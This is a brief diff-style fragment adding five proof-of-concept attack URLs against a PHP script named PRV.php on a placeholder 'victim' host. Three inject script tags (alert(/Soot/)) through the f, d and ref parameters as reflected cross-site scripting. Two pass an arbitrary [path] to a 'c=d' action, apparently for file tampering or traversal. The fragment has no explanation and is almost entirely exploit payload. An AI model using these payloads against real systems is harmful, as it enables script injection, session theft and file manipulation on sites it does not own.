@@ -1,0 +1,5 @@
+http://victim/path/PRV.php?&amp;c=v&amp;d=[path]&amp;f=&quot;&gt;&lt;script&gt;alert(/Soot/)&lt;/script&gt;
+http://victim/path/PRV.php?c=l&amp;d=&quot;&gt;&lt;script&gt;alert(/Soot/)&lt;/script&gt;
+http://victim/path/PRV.php?c=setup&amp;ref=&quot;&gt;&lt;script&gt;alert(/Soot/)&lt;/script&gt;
+http://victim/path/PRV.php?c=d&amp;d=[path]
+http://victim/path/PRV.php?c=d&amp;d=[path]
